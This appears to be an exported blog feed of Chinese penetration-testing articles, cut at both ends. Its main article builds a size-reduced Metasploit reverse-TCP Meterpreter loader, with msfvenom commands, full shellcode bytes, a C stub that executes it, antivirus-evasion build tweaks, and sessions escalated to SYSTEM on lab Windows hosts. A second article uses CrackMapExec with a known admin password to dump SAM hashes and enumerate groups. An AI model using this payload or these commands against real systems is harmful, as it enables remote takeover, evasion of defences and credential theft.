4</span><br></pre></td></tr></table></figure><p><img src="../do/media/6a0efefd3fd932404661acb1a3048550.jpg" alt></p><p>Windows 7 分别访问攻击机33389，30080，既等价访问靶机3389，80  </p><p><img src="../do/media/4f26effa8487978945eea66754b9e575.jpg" alt></p><p><img src="../do/media/c007b1fcde98338dd491f671a19888b6.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>94、基于实战中的small-payload</title>
      <link href="/article/94_%E5%9F%BA%E4%BA%8E%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84small-payload.html"/>
      <url>/article/94_%E5%9F%BA%E4%BA%8E%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84small-payload.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><p><strong>攻击机：</strong><br>192.168.1.5 Debian<br><strong>靶机：</strong><br>192.168.1.4 Windows 7<br>192.168.1.119 Windows 2003</p><h3 id="攻击机配置："><a href="#攻击机配置：" class="headerlink" title="攻击机配置："></a>攻击机配置：</h3><p>payload：windows/meterpreter/reverse_tcp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.5 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.5:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/05b541c239afdafa628b0ef194eddcb7.jpg" alt></p><h3 id="payload生成："><a href="#payload生成：" class="headerlink" title="payload生成："></a>payload生成：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 ‐b &apos;\x00&apos; ‐f exe &gt; First.exe</span><br></pre></td></tr></table></figure><p>原始payload大小如下：<br>73802字节，大概在72KB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# du ‐sb First.exe</span><br><span class="line">73802 First.exe</span><br></pre></td></tr></table></figure><h3 id="第一次优化payload："><a href="#第一次优化payload：" class="headerlink" title="第一次优化payload："></a>第一次优化payload：</h3><p>提取windows/meterpreter/reverse_tcp shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 ‐b &apos;\x00&apos; ‐f c</span><br><span class="line">[‐] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[‐] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 368</span><br><span class="line">Payload size: 368 bytes</span><br><span class="line">Final size of c file: 1571 bytes</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\\xd9\\xc3\\xba\\xa1\\x43\\xe5\\x72\\xd9\\x74\\x24\\xf4\\x5d\\x29\\xc9\\xb1&quot;</span><br><span class="line">&quot;\\x56\\x31\\x55\\x18\\x03\\x55\\x18\\x83\\xc5\\xa5\\xa1\\x10\\x8e\\x4d\\xa7&quot;</span><br><span class="line">&quot;\\xdb\\x6f\\x8d\\xc8\\x52\\x8a\\xbc\\xc8\\x01\\xde\\xee\\xf8\\x42\\xb2\\x02&quot;</span><br><span class="line">&quot;\\x72\\x06\\x27\\x91\\xf6\\x8f\\x48\\x12\\xbc\\xe9\\x67\\xa3\\xed\\xca\\xe6&quot;</span><br><span class="line">&quot;\\x27\\xec\\x1e\\xc9\\x16\\x3f\\x53\\x08\\x5f\\x22\\x9e\\x58\\x08\\x28\\x0d&quot;</span><br><span class="line">&quot;\\x4d\\x3d\\x64\\x8e\\xe6\\x0d\\x68\\x96\\x1b\\xc5\\x8b\\xb7\\x8d\\x5e\\xd2&quot;</span><br><span class="line">&quot;\\x17\\x2f\\xb3\\x6e\\x1e\\x37\\xd0\\x4b\\xe8\\xcc\\x22\\x27\\xeb\\x04\\x7b&quot;</span><br><span class="line">&quot;\\xc8\\x40\\x69\\xb4\\x3b\\x98\\xad\\x72\\xa4\\xef\\xc7\\x81\\x59\\xe8\\x13&quot;</span><br><span class="line">&quot;\\xf8\\x85\\x7d\\x80\\x5a\\x4d\\x25\\x6c\\x5b\\x82\\xb0\\xe7\\x57\\x6f\\xb6&quot;</span><br><span class="line">&quot;\\xa0\\x7b\\x6e\\x1b\\xdb\\x87\\xfb\\x9a\\x0c\\x0e\\xbf\\xb8\\x88\\x4b\\x1b&quot;</span><br><span class="line">&quot;\\xa0\\x89\\x31\\xca\\xdd\\xca\\x9a\\xb3\\x7b\\x80\\x36\\xa7\\xf1\\xcb\\x5e&quot;</span><br><span class="line">&quot;\\x04\\x38\\xf4\\x9e\\x02\\x4b\\x87\\xac\\x8d\\xe7\\x0f\\x9c\\x46\\x2e\\xd7&quot;</span><br><span class="line">&quot;\\x95\\x41\\xd1\\x07\\x1d\\x01\\x2f\\xa8\\x5d\\x0b\\xf4\\xfc\\x0d\\x23\\xdd&quot;</span><br><span class="line">&quot;\\x7c\\xc6\\xb3\\xe2\\xa8\\x72\\xbe\\x74\\x93\\x2a\\xbf\\x81\\x7b\\x28\\xc0&quot;</span><br><span class="line">&quot;\\x89\\x4e\\xa5\\x26\\xd9\\xe0\\xe5\\xf6\\x9a\\x50\\x45\\xa7\\x72\\xbb\\x4a&quot;</span><br><span class="line">&quot;\\x98\\x63\\xc4\\x81\\xb1\\x0e\\x2b\\x7f\\xe9\\xa6\\xd2\\xda\\x61\\x56\\x1a&quot;</span><br><span class="line">&quot;\\xf1\\x0f\\x58\\x90\\xf3\\xf0\\x17\\x51\\x76\\xe3\\x40\\x06\\x78\\xfb\\x90&quot;</span><br><span class="line">&quot;\\xa3\\x78\\x91\\x94\\x65\\x2f\\x0d\\x97\\x50\\x07\\x92\\x68\\xb7\\x14\\xd5&quot;</span><br><span class="line">&quot;\\x97\\x46\\x2c\\xad\\xae\\xdc\\x10\\xd9\\xce\\x30\\x90\\x19\\x99\\x5a\\x90&quot;</span><br><span class="line">&quot;\\x71\\x7d\\x3f\\xc3\\x64\\x82\\xea\\x70\\x35\\x17\\x15\\x20\\xe9\\xb0\\x7d&quot;</span><br><span class="line">&quot;\\xce\\xd4\\xf7\\x21\\x31\\x33\\x84\\x26\\xcd\\xc1\\xa3\\x8e\\xa5\\x39\\xf4&quot;</span><br><span class="line">&quot;\\x2e\\x35\\x50\\xf4\\x7e\\x5d\\xaf\\xdb\\x71\\xad\\x50\\xf6\\xd9\\xa5\\xdb&quot;</span><br><span class="line">&quot;\\x97\\xa8\\x54\\xdb\\xbd\\x6d\\xc8\\xdc\\x32\\xb6\\xfb\\xa7\\x3b\\x49\\xfc&quot;</span><br><span class="line">&quot;\\x57\\x52\\x2e\\xfd\\x57\\x5a\\x50\\xc2\\x81\\x63\\x26\\x05\\x12\\xd0\\x39&quot;</span><br><span class="line">&quot;\\x30\\x37\\x71\\xd0\\x3a\\x6b\\x81\\xf1&quot;;</span><br></pre></td></tr></table></figure><p><img src="../do/media/c02510e309ce675fbb9967d140f9349a.jpg" alt></p><p>建立Micropoor_small_payload工程，配置如下：</p><p><img src="../do/media/e70e50159dcedd636390c6fa85b020b2.jpg" alt></p><p><img src="../do/media/bae881deb4bd31f0a9bae8e76b42317f.jpg" alt></p><h3 id="源码如下："><a href="#源码如下：" class="headerlink" title="源码如下："></a>源码如下：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *shellcode = (<span class="keyword">char</span> *)<span class="string">"Micropoor_shellcode"</span>; </span><br><span class="line"></span><br><span class="line">DWORD Micropoor_shellcode;</span><br><span class="line">BOOL ret = VirtualProtect(shellcode, <span class="built_in">strlen</span>(shellcode),</span><br><span class="line">PAGE_EXECUTE_READWRITE, &amp;Micropoor_shellcode);</span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>原始shellcode_payload大小如下：</strong><br>75776字节</p><p><img src="../do/media/54c47b96f743bf3ebc746cc37dbe3b76.jpg" alt></p><p><strong>优化：</strong><br>在优化的过程中，需要确保</p><ul><li>性能  </li><li>稳定性  </li><li>大小  </li><li>可塑性  </li><li>免杀性  </li></ul><p><strong>非算法，故优化/01</strong><br><img src="../do/media/161777edfb7fa266eb4210cd530675be.jpg" alt></p><p>无使用预编译头，故否<br><img src="../do/media/7f60d00c6e928957e7739914e27b8618.jpg" alt></p><p><strong>无需调试信息，故否</strong><br><img src="../do/media/899a118c7ee938b168bcf1ae5677d2ac.jpg" alt></p><p><strong>自定义入口点：execMicropoor_shellcode</strong><br><img src="../do/media/55a9e1b87b08ce164cf6bee8167d3491.jpg" alt></p><p><strong>再次编译：</strong><br><img src="../do/media/357710f6faabc6604bbaa35592ce79db.jpg" alt></p><p><strong>payload大小如下：</strong><br>4608字节<br><img src="../do/media/bdd9366a5d3006aaaab48cf97908022b.jpg" alt></p><h3 id="第一次靶机测试：分别测试Windows-2003，Windws-7，reverse-OK。"><a href="#第一次靶机测试：分别测试Windows-2003，Windws-7，reverse-OK。" class="headerlink" title="第一次靶机测试：分别测试Windows 2003，Windws 7，reverse OK。"></a>第一次靶机测试：分别测试Windows 2003，Windws 7，reverse OK。</h3><p><img src="../do/media/542ba22b5fc53ca130875f92d4bef49e.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.5:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.119</span><br><span class="line">[*] Meterpreter session 4 opened (192.168.1.5:53 ‐&gt; 192.168.1.119:3887) at 2019‐01‐27 14:30:27 ‐0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN03X64\Administrator</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h3 id="第二次优化payload："><a href="#第二次优化payload：" class="headerlink" title="第二次优化payload："></a>第二次优化payload：</h3><p>载入PEID<br><img src="../do/media/d176f010a1d7452d445b3104d0abeadc.jpg" alt></p><p><strong>合并data to text，rdata to text 在次生成。</strong>  </p><p><img src="../do/media/0b89c5497f2f22d399e3e7030fd521f0.jpg" alt></p><p><strong>Section变化如下：</strong>  </p><p><img src="../do/media/a199a5e70d9ace704ba3501be0de41e4.jpg" alt></p><p><strong>payload大小如下：</strong><br>4096字节  </p><p><img src="../do/media/7b7ccfb69f47d0f2d8a901f885f2899a.jpg" alt></p><p><strong>第二次靶机测试：</strong>分别测试Windows 2003，Windws 7，reverse OK。  </p><p><img src="../do/media/a1daafaffa7abc656d309fb8429cbebf.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.5:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.119</span><br><span class="line">[*] Meterpreter session 9 opened (192.168.1.5:53 ‐&gt; 192.168.1.119:3891) at 2019‐01‐27 14:46:20 ‐0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN03X64\Administrator</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1232</span><br></pre></td></tr></table></figure><h3 id="第三次优化payload："><a href="#第三次优化payload：" class="headerlink" title="第三次优化payload："></a>第三次优化payload：</h3><p>在00000E60起含有大部分000h，充填掉00，在次生成payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h,</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p><img src="../do/media/22aa6b22b6a725c1cd042fe3d272c195.jpg" alt></p><p><strong>payload大小如下：</strong>  </p><p>3174字节  </p><p><img src="../do/media/583f8432508fadce87963dda9074623a.jpg" alt></p><p><strong>第三次靶机测试：</strong>分别测试Windows 2003，Windws 7，reverse OK。并且最终编译运行库依然为：<strong>/MT</strong>  </p><p><img src="../do/media/4e172aa523497f62e049cc0e7dfb622a.jpg" alt></p><p><img src="../do/media/25c74a3a578b2e23477821175b489769.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.5:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.119</span><br><span class="line">[*] Meterpreter session 11 opened (192.168.1.5:53 ‐&gt; 192.168.1.119:3894) at 2019‐01‐27 14:56:30 ‐0500 6</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN03X64\Administrator</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 3152</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p><img src="../do/media/74defd3d7b4b42c88aadac9d9d4fd476.jpg" alt></p><h3 id="第四次优化payload："><a href="#第四次优化payload：" class="headerlink" title="第四次优化payload："></a>第四次优化payload：</h3><p>…….</p><p>文中的前三次优化，三次生成，已满足大部分实战场景。当遇到更苛刻的实战场景，75776字节优化到3174字节，接下来的季中，会继续优化。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>93、与CrackMapExec结合攻击</title>
      <link href="/article/93_%E4%B8%8ECrackMapExec%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB.html"/>
      <url>/article/93_%E4%B8%8ECrackMapExec%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，痛风</strong>等。</p><p>CrackMapExec弥补了MSF4下auxiliary，scanner模块下的Command执行方式，但MSF5已解决该问题。在MSF4下，该框架针对后渗透的横向移动经常出现，虽然MSF5已解决该问题，但该框架在配合bloodhound与empire依然目前有一定优势。</p><p>安装方式：from Wiki：</p><h3 id="Kali："><a href="#Kali：" class="headerlink" title="Kali："></a>Kali：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt‐get install crackmapexec</span><br></pre></td></tr></table></figure><p>但作者推荐pipenv安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt‐get install ‐y libssl‐dev libffi‐dev python‐dev build‐essential</span><br><span class="line">pip install ‐‐user pipenv</span><br><span class="line">git clone ‐‐recursive https://github.com/byt3bl33d3r/CrackMapExec</span><br><span class="line">cd CrackMapExec &amp;&amp; pipenv install</span><br><span class="line">pipenv shell</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h3 id="Mac-OSX："><a href="#Mac-OSX：" class="headerlink" title="Mac OSX："></a>Mac OSX：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ‐‐user crackmapexec</span><br></pre></td></tr></table></figure><p>默认为100线程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.0/24</span><br><span class="line">SMB 192.168.1.4 445 JOHN‐PC [*] Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">x64 (name:JOHN‐PC) (domain:JOHN‐PC) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [*] Windows Server 2003 R2 3790 Service</span><br><span class="line">Pack 2 x32 (name:WIN03X64) (domain:WIN03X64) (signing:False) (SMBv1:True)</span><br></pre></td></tr></table></figure><p><img src="../do/media/ebb1d4734cf101b0af75130b24dc2797.jpg" alt></p><p>密码策略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cme smb 192.168.1.119 ‐u administrator ‐p &apos;123456&apos; ‐‐pass ‐pol</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [*] Windows Server 2003 R2 3790 Service</span><br><span class="line">Pack 2 x32 (name:WIN03X64) (domain:WIN03X64) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [+] WIN03X64\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [+] Dumping password info for domain: WIN03X64</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Minimum password length: None</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Password history length: None</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Maximum password age: 42 days 22 hours 47 minutes</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Password Complexity Flags: 000000</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Domain Refuse Password Change: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Domain Password Store Cleartext: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Domain Password Lockout Admins: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Domain Password No Clear Change: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Domain Password No Anon Change: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Domain Password Complex: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Minimum password age: None</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Reset Account Lockout Counter: 30 minutes</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Locked Account Duration: 30 minutes</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Account Lockout Threshold: None</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Forced Log off Time: Not Set</span><br></pre></td></tr></table></figure><p><img src="../do/media/6caecd2d3353752952b4fa71fb5cff9c.jpg" alt></p><p>list hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cme smb 192.168.1.119 ‐u administrator ‐p &apos;123456&apos; ‐‐sam</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [*] Windows Server 2003 R2 3790 Service</span><br><span class="line">Pack 2 x32 (name:WIN03X64) (domain:WIN03X64) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [+] WIN03X64\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [+] Dumping SAM hashes</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Guest:501:aad3b435b51404eeaad3b435b51404ee:67f33d2095bda39fbf6b63fbadf2313a:::</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:f4d13c67c7608094c9b0e39147f07520:::</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 IUSR_WIN03X64:1003:dbec20afefb6cc332311fb9822ba61ce:68c22a11c400d91fa4f66ff36b3c15dc:::</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 IWAM_WIN03X64:1004:ff783381e4e022de176c59bf598409c7:7e456daac229ddceccf5f367aa69a487:::</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 ASPNET:1008:cc26551b70faffc095feb73db16b65ff:fec6e9e4a08319a1f62cd30447247f88:::</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [+] Added 6 SAM hashes to the database</span><br></pre></td></tr></table></figure><p><img src="../do/media/d372f49b841caef362dbced12e0a0149.jpg" alt></p><p>枚举组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cme smb 192.168.1.119 ‐u administrator ‐p &apos;123456&apos; ‐‐local‐groups</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [\*] Windows Server 2003 R2 3790 Service</span><br><span class="line">Pack 2 x32 (name:WIN03X64) (domain:WIN03X64) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [+] WIN03X64\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [+] Enumerated local groups</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 HelpServicesGroup membercount: 1</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 IIS_WPG membercount: 4</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 TelnetClients membercount: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Administrators membercount: 1</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Backup Operators membercount: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Distributed COM Users membercount: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Guests membercount: 2</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Network Configuration Operators membercount: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Performance Log Users membercount: 1</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Performance Monitor Users membercount: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Power Users membercount: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Print Operators membercount: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Remote Desktop Users membercount: 0</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 Replicator membercount: 0</span><br><span 